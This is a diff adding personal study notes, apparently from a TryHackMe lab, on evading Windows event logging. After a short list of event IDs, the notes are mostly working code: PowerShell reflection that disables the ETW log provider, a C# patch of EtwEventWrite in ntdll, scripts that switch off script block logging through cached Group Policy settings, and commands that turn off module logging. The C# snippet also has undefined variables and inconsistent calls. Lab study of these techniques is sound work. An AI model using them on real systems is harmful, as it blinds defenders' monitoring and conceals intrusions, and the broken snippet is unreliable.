@@ -1,0 +1,83 @@
+### evade logging and monitoring ###
+## links ##
+https://tryhackme.com/room/monitoringevasion
+
+
+## Event tracing ##
+Controllers	Build and configure sessions
+Providers	Generate events
+Consumers	Interpret events
+
+Events are sent and transferred in XML(Extensible Markup Language)
+
+ID 4624: An account was successfully logged on.
+ID 4726: AD User/Account deleted event id.
+ID 4743: Computer account deleted event id.
+ID 1102: Logs when the Windows Security audit log was cleared
+ID 104:  Logs when the log file was cleared
+ID 1100: Logs when the Windows Event Log service was shut down
+
+Trying to clear logs will throw events logs
+
+
+
+## PSEtwLogProvider reflection ##
+# reflection.ps1
+$logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider');
+$etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null);
+[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider,0);
+# then exec "whoami", no event will be created
+
+
+
+## EtwEventWrite patching ##
+# patch.cs
+var ntdll = Win32.LoadLibrary("ntdll.dll");
+var etwFunction = Win32.GetProcAddress(ntdll, "EtwEventWrite");
+uint oldProtect;
+Win32.VirtualProtect(etwFunction, (UIntPtr)patch.Length, 0x40, out oldProtect);
+patch(new byte[] { 0xc2, 0x14, 0x00 });
+Marshal.Copy(patch, 0, etwEventSend, patch.Length);
+VirtualProtect(etwFunction, 4, oldProtect, &oldOldProtect);
+Win32.FlushInstructionCache(etwFunction, NULL);
+
+
+
+## Group Policy Takeover ##
+Script block logging will log any script blocks executed within a PowerShell session.
+Introduced in PowerShell v4 and improved in PowerShell v5, the ETW provider has two event IDs it will report.
+ID 4103: Logs command invocation
+ID 4104: Logs script block execution
+
+# gpo.ps1
+$GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static');
+$GroupPolicySettings = $GroupPolicySettingsField.GetValue($null);
+$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0;
+$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0;
+# then exec "whoami", no event will be created
+
+# gpo-v5-1.ps1	=> for new v5.1 updates of powershell
+$GroupPolicyField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static');
+If ($GroupPolicyField) {
+    $GroupPolicyCache = $GroupPolicyField.GetValue($null);
+    If ($GroupPolicyCache['ScriptBlockLogging']) {
+        $GroupPolicyCache['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0;
+        $GroupPolicyCache['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0;
+    }
+    $val = [System.Collections.Generic.Dictionary[string,System.Object]]::new();
+    $val.Add('EnableScriptBlockLogging', 0);
+    $val.Add('EnableScriptBlockInvocationLogging', 0);
+    $GroupPolicyCache['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'] = $val
+};
+# then exec "whoami", no event will be created
+
+
+
+## module logging ##
+# mod.ps1
+$module = Get-Module Microsoft.PowerShell.Utility;
+$module.LogPipelineExecutionDetails = $false;
+$snap = Get-PSSnapin Microsoft.PowerShell.Core;
+$snap.LogPipelineExecutionDetails = $false;
+
+
